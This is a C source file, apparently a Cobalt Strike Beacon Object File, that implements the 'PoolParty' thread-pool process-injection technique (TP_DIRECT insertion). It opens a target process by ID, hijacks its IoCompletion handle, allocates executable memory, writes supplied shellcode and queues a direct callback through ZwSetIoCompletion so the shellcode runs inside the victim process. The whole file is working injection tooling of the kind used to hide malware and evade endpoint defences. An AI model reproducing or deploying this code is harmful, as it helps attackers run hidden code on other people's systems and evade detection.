#include "../_include/beacon.h"
#include "PoolParty.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);

HANDLE m_p_hIoCompletion = NULL;

HANDLE HijackIoCompletionProcessHandle(HANDLE processHandle) {
    return HijackProcessHandle((PWSTR)L"IoCompletion\0", processHandle, IO_COMPLETION_ALL_ACCESS);
}

HANDLE GetTargetThreadPoolIoCompletionHandle(HANDLE processHandle) {
    HANDLE p_hIoCompletion = HijackIoCompletionProcessHandle(processHandle);
    return p_hIoCompletion;
}

void RemoteTpDirectInsertionSetupExecution(HANDLE processHandle, LPVOID buffer) {
    _ZwSetIoCompletion ZwSetIoCompletion = (_ZwSetIoCompletion)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwSetIoCompletion")); //
    TP_DIRECT Direct = { 0 };
    Direct.Callback = buffer;

    PTP_DIRECT RemoteDirectAddress = (PTP_DIRECT)(KERNEL32$VirtualAllocEx(processHandle, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
    NTSTATUS res = NtWriteVirtualMemory(processHandle, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT), NULL);

    ZwSetIoCompletion(m_p_hIoCompletion, RemoteDirectAddress, 0, 0, 0);
}

void HijackHandles(HANDLE processHandle) {
    m_p_hIoCompletion = GetTargetThreadPoolIoCompletionHandle(processHandle);
}

void Inject7(DWORD dwTargetProcessId, CHAR* shellcode, SIZE_T shellcodeSize) {
    HANDLE hTarget = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwTargetProcessId);
    HijackHandles(hTarget);
    PVOID pShellcodeAddress = KERNEL32$VirtualAllocEx(hTarget, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
    NtWriteVirtualMemory(hTarget, pShellcodeAddress, shellcode, shellcodeSize, NULL);
    RemoteTpDirectInsertionSetupExecution(hTarget, pShellcodeAddress);
}
